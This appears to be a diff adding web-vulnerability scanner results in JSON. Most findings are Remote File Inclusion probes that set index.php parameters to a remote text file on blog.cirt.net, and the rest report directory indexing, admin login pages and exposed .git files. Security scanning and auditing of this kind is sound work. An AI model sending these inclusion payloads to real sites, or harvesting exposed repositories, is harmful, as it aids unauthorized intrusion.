+            "msg": "/index.php?principal=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005140",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?proMod=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005141",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?proMod=http://blog.cirt.net/rfiinc.txt?cmd: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005142",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?project=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005143",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?repinc=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005144",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?root_prefix=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005145",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?root_prefix=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005146",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?section=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005147",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?site=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005148",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?site_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005149",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?styl[top]=http://blog.cirt.net/rfiinc.txt??: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005150",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?template=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005151",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?templates_dir=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005152",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?theme=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005153",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?themepath=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005154",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?themesdir=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005155",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?this_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005156",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?txt=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005157",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?up=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005158",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?url=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005159",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?w=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005160",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?way=http://blog.cirt.net/rfiinc.txt??????????????: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "750500",
+            "method": "GET",
+            "url": "",
+            "msg": "/configuration/: Directory indexing found."
+        },
+        {
+            "id": "006303",
+            "method": "GET",
+            "url": "",
+            "msg": "/configuration/: Admin login page/section found."
+        },
+        {
+            "id": "006333",
+            "method": "GET",
+            "url": "",
+            "msg": "/login.php: Admin login page/section found."
+        },
+        {
+            "id": "006530",
+            "method": "GET",
+            "url": "",
+            "msg": "/.git/index: Git Index file may contain directory listing information."
+        },
+        {
+            "id": "006609",
+            "method": "GET",
+            "url": "",
+            "msg": "/.git/HEAD: Git HEAD file found. Full repo details may be present."
+        },
+        {
+            "id": "750500",
+            "method": "GET",
+            "url": "",
+            "msg": "/webservices/: Directory indexing found."
+        },
+        {
+            "id": "006714",
+            "method": "GET",
+            "url": "",
+            "msg": "/webservices/: Webservices found."
+        },
+        {
+            "id": "006807",
+            "method": "GET",
+            "url": "",
+            "msg": "/.git/config: Git config file found. Infos about repo details may be present."
+        },
+        {
+            "id": "007302",
+            "method": "GET",
+            "url": "",
+            "msg": "/README.md: Readme Found."
+        }
+    ]
+}
